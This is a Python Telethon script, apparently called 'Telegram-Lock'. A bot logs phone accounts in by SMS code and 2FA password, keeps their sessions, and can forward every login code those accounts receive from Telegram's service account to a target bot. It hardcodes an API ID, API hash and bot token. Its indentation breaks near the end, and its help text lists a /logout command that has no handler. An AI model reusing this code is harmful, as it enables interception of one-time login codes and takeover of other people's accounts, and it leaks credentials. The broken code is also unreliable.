import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError
)

# Log config
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# API Settings
API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
TARGET_BOT_ID = 8754918048

# Global storage
accounts = {}
user_login_states = {}
PHONE_REGEX = re.compile(r'^\+\d{10,15}$')


def bind_account_handlers(client, phone):
    target_entity = None

    async def load_bot():
        nonlocal target_entity
        retry = 0
        while retry < 3:
            try:
                target_entity = await client.get_entity(TARGET_BOT_ID)
                logger.info(f"[{phone}] Bot loaded, id={target_entity.id}")
                break
            except Exception as err:
                retry += 1
                logger.warning(f"[{phone}] Load bot failed retry {retry}/3: {str(err)}")
                await asyncio.sleep(2)

    client.loop.create_task(load_bot())

    @client.on(events.NewMessage(outgoing=True))
    async def self_check(event):
        if event.text and event.text.lower() == "self check":
            await event.edit("self checked!")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def check_switch(event):
        stat = "on" if accounts[phone]["anti_login"] else "off"
        await event.edit(f"Push status: {stat}")
        logger.info(f"[{phone}] Query status {stat}")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable(event):
        accounts[phone]["anti_login"] = True
        await event.edit("Auto push enabled")
        logger.info(f"[{phone}] Push ON")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable(event):
        accounts[phone]["anti_login"] = False
        await event.edit("Auto push disabled")
        logger.info(f"[{phone}] Push OFF")

    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_code(event):
        logger.info(f"[{phone}] Receive sms, push={accounts[phone]['anti_login']}")
        if accounts[phone]["anti_login"] and target_entity:
            try:
                text = f"Phone:{phone}\nCode:\n{event.text}"
                await client.send_message(target_entity, text)
                logger.info(f"[{phone}] Send success")
            except Exception as err:
                logger.error(f"[{phone}] Send error: {str(err)}")


# Main management bot
bot_client = TelegramClient(StringSession(), API_ID, API_HASH)


@bot_client.on(events.NewMessage(pattern="/start"))
async def help_msg(event):
    msg = """Command List
Local phone chat:
self check        Test running
antilogin         Check push switch
antilogin on      Enable auto send code
antilogin off     Disable auto send code

Bot private commands:
/addphone +8613800138000    Login new monitor phone
/listphone                  Show all logged phones
/delphone +8613800138000    Delete session
/logout +8613800138000      Remote logout
"""
    await event.reply(msg)


@bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
async def add_phone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_REGEX.match(phone):
        await event.reply("Invalid format, example: /addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("This phone already logged in")
        return

    session_name = f"session_{phone.replace('+','')}"
    new_cli = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_cli.connect()
        code_req = await new_cli.send_code_request(phone)
        user_login_states[event.sender_id] = {
            "client": new_cli,
            "phone": phone,
            "code_hash": code_req.phone_code_hash,
            "step": "input_sms_code"
        }
        await event.reply(f"Code sent to {phone}, reply number code to login")
    except PhoneNumberInvalidError:
        await event.reply("Wrong phone number")
    except AuthKeyDuplicatedError:
        await event.reply("Account logged on other device")
    except Exception as err:
        await event.reply(f"Send code error: {str(err)}")


@bot_client.on(events.NewMessage)
async def login_flow(event):
    if event.sender_id not in user_login_states:
        return
    state = user_login_states[event.sender_id]
    input_text = event.text.strip()

    if state["step"] == "input_sms_code":
        if not input_text.isdigit():
            return
        try:
            await state["client"].sign_in(
                phone_code_hash=state["code_hash"],
                code=input_text
            )
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"{state['phone']} login done, use antilogin on to push code")
        except SessionPasswordNeededError:
            state["step"] = "input_2fa_password"
            await event.reply("Account enable 2FA, reply password")
        except PhoneCodeInvalidError:
            await event.reply("Wrong code, use /addphone retry")
            del user_login_states[event.sender_id]
        except Exception as err:
            await event.reply(f"Login failed: {str(err)}")
            del user_login_states[event.sender_id]

    elif state["step"] == "input_2fa_password":
        try:
            await state["client"].sign_in(password=input_text)
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"{state['phone']} login complete with 2FA")
        except Exception as err:
            await event.reply(f"Wrong 2FA password, retry /addphone")
            del user_login_states[event.sender_id]


@bot_client.on(events.NewMessage(pattern="/listphone"))
async def list_all(event):
    if not accounts:
        await event.reply("No logged phone, use /addphone")
        return
    out = "Logged Phones:\n"
    for num, data in accounts.items():
        status = "Push ON" if data["anti_login"] else "Push OFF"
        out += f"- {num} | {status}\n"
    await event.reply(out)


@bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
async def delete_session(event):
    phone = event.pattern_match.group(1).strip()
     if phone not in accounts:
         await event.reply("Phone not found")
         return
     try:
         await accounts[phone]["client"].log_out()
         await accounts[phone]["client"].disconnect()
         del accounts[phone]
         session_file = f"session_{phone.replace('+','')}.session"
         if os.path.exists(session_file):
             os.remove(session_file)
         await event.reply(f"{phone} remote logout success")
     except Exception as err:
         await event.reply(f"Logout error: {str(err)}")
 async def main():
     print("Telegram-Lock Start")
     await bot_client.start(bot_token=BOT_TOKEN)
     print("Management Bot Online, send /start")
     while True:
         await asyncio.sleep(1/60)
 if __name__ == "__main__":
     asyncio.run(main())
